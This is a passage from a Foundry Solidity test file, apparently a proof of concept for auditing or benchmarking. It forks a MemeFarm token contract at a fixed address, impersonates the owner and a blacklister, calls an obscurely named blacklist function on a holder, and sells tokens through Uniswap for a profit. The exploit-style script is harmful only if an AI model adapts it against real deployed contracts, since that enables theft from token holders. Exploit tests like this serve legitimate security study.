        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to get MemeFarm tokens to sell
        // The contract is already deployed at TARGET
        // We'll impersonate the owner to transfer tokens to attacker
        address owner = IMemeFarm(TARGET).owner();
        vm.startPrank(owner);
        // Transfer some tokens to attacker (1% of total supply)
        uint256 totalSupply = IMemeFarm(TARGET).totalSupply();
        uint256 attackerTokens = totalSupply / 100;
        IMemeFarm(TARGET).transfer(attacker, attackerTokens);
        vm.stopPrank();

        // Also need some ETH for gas (but selling tokens will give us ETH)
        deal(attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate the ________ address to blacklist victims
        address blacklister = 0x3aB960dCf9359083DC126222c03bfB0d2A3C9b6b;
        vm.prank(blacklister);
        // Blacklist some random victim address (could be any holder except attacker)
        IMemeFarm(TARGET).qwidji(address(0x1234567890123456789012345678901234567890), true);

        // Step 2: Approve router to spend our tokens
        uint256 attackerTokens = IMemeFarm(TARGET).balanceOf(attacker);
        IMemeFarm(TARGET).approve(address(IMemeFarm(TARGET).uniswapV2Router()), attackerTokens);

        // Step 3: Sell tokens via the DEX pair
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = IMemeFarm(TARGET).uniswapV2Router().WETH();

        // Sell half of tokens to avoid hitting max limits
        uint256 sellAmount = attackerTokens / 2;
        IMemeFarm(TARGET).uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0, // accept any amount of ETH
            path,
            attacker,
            block.timestamp
        );

        // Step 4: Verify profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

